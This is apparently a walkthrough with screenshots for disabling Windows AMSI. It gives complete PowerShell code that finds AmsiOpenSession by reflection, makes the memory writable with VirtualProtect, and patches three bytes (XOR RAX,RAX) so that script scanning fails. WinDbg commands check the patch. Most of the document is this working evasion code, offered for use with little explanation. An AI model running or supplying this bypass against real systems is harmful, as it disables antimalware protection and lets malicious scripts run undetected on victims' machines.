dump the content of AmsiOpenSession using WinDbg
![image](https://github.com/user-attachments/assets/402e6ca9-a7fc-49a3-9fe5-14710ad31f89)


u amsi !AmsiOpenSession L1A
![image](https://github.com/user-attachments/assets/851c26b3-7f12-4395-90a8-861048bf4352)

Replace the TEST RDX,RDX instruction with an XOR RAX,RAX instruction to redirect the execution flow to the error branch, effectively disabling AMSI.
We can disable AMSI by overwriting only three bytes of memory inside the AmsiOpenSession API. 

locate AmsiOpenSession
![image](https://github.com/user-attachments/assets/b6382fd5-e7ed-42a1-aab2-365693c6d4b6)

```
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$funcAddr
```
 attach powershell ise process
 ![image](https://github.com/user-attachments/assets/cfd550b3-6f94-477b-8dce-b008c6587887)

translate to hexidecimal using ? 0n(LOCATEAMSIOPENSESSION)

![image](https://github.com/user-attachments/assets/611184fc-a284-4d0d-9547-820778762976)

Unassemble to check if it correct
u 00007ffe`749f3560
![image](https://github.com/user-attachments/assets/3e422be4-fcaf-48e0-b4bd-7d2dfff94edb)

Now look at memory protection
!vprot 7ffe749f3560
![image](https://github.com/user-attachments/assets/1ca243ec-4298-4aa7-995b-b69747d5ea91)

Change memory protection to mess with our 3 byte
continue execution with 'g'
![image](https://github.com/user-attachments/assets/cc1dcb9d-4375-4792-a65b-4be035f1c46b)


Should return true
```
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
```

Break 
![image](https://github.com/user-attachments/assets/3416aa1d-f1d7-4094-801f-5051d16f2e3e)

Run again
!vprot 7ffe749f3560
Changed
![image](https://github.com/user-attachments/assets/6ea62b81-fc48-472c-86bb-3a3165c46674)

Now we can overwrite those 3 bytes
This should disable AMSI as soon as it is used


$buf = [Byte[]] (0x48, 0x31, 0xC0) 
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
![image](https://github.com/user-attachments/assets/249feac9-80e5-43e9-b26d-b57d77e0314e)

To restore memory protection
$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
![image](https://github.com/user-attachments/assets/ff1c9fc4-a308-4973-ba14-21e6c800c8ff)

Verify with windebug
Break
u 7ffe749f3560
!vprot 7ffe749f3560
![image](https://github.com/user-attachments/assets/bc381cad-303a-4b1b-a3db-d81238d931da)
![image](https://github.com/user-attachments/assets/2fa02082-4ce3-470e-b7ad-6185c177ddbf)

begin debug
good execution bypass for now
![image](https://github.com/user-attachments/assets/738fe09d-a32e-46de-b783-368fe8cefff9)


